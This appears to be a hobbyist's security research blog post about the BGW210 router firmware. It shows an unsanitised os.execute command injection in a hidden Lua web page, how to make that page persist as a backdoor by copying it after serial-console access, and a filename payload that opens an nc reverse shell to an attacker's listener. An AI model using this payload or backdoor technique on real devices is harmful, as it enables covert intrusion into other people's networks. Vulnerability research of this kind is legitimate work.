# Backdooring the BGW210 with a single `cp` command
When I started looking for a winter break project, I was told that wifi router firmware was extremely easy to find your first "real" bug in- which turned out to be excellent advice. Not knowing anything about picking a router, I looked at the model number on the back of my router, and found a [firmware dump](https://archive.org/details/BGW210-700-Firmware-Collection). Checking it out with `binwalk`, there was a bunch of licensing and certificate data, along with a squashfs filesystem.


## The webpages
The webpages are served via cgi-bin using `lighttpd`, with `/bin/webasp` generating the HTML from some weird templated Lua. Confusingly, there's actually code for three separate web interfaces in the `/www` directory, although `/www/att` is the only one served by default. 
Inside of `/www/wificert`, one of the 2 web portals not enabled by default, however, there's something <i>very</i> interesting. 
```lua
if ENV.REQUEST_METHOD == "POST" then
  if FORM.Cancel ~= nil then
    if FORM.uploadfile ~= nil and FORM.uploadfile ~= "" then
        os.execute("rm -f "..FORM.uploadfile)
```
Assuming we can set up a way to access this page, we've got an extremely simple way to get persistence. 

## The game plan
This command injection gives us two methods to create a very low-profile, easy-to-implement backdoor that, depending on which strategy we use, can even persist across firmware updates. 
<br><br>
<b>Method 1: </b> Copy or link the vulnerable `update.ha` page into the `/www/att` directory <br>
<b>Method 2: </b> Change the configuration so that we serve the `/www/wificert` pages. This appears to happen via TR-069 configuration, but I wasn't able to figure it out over winter break. 

## My setup
Unfortunately, I didn't find anything cool or sexy like unprivelleged RCE, although the BGW210 does have some pins on the board which allow for shell access over a serial cable. So, I got my hands on a guinea pig BGW210 and a TTL to USB adapter, and started soldering. 
After getting the adapter put in, I opened up PuTTY and connected to the COM port. [this writeup](https://gist.github.com/quonic/fab50d7e0979ab21675150a15957cb66) gives some more in-depth info about how to do the hardware part, but I'm gonna skim over it so that I don't have to attach a picture of my atrocious soldering work. 

## Persistence 
After we get our shell, we can simply `cp /www/wificert/cgi-bin/update.ha /www/att/cgi-bin/update.ha`, or something a little more sneaky if you prefer. To use our backdoor, since I'm too lazy to figure out file uploads with `curl`, all we need to do is visit `http://<your-gateway-ip>/cgi-bin/update.ha` in burpsuite, intercept the request and change the filename to `;mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc <IP> <PORT> 1>/tmp/b`. Set up your listener, let the request through, and the vulnerable update.ha page should give you your shell.  
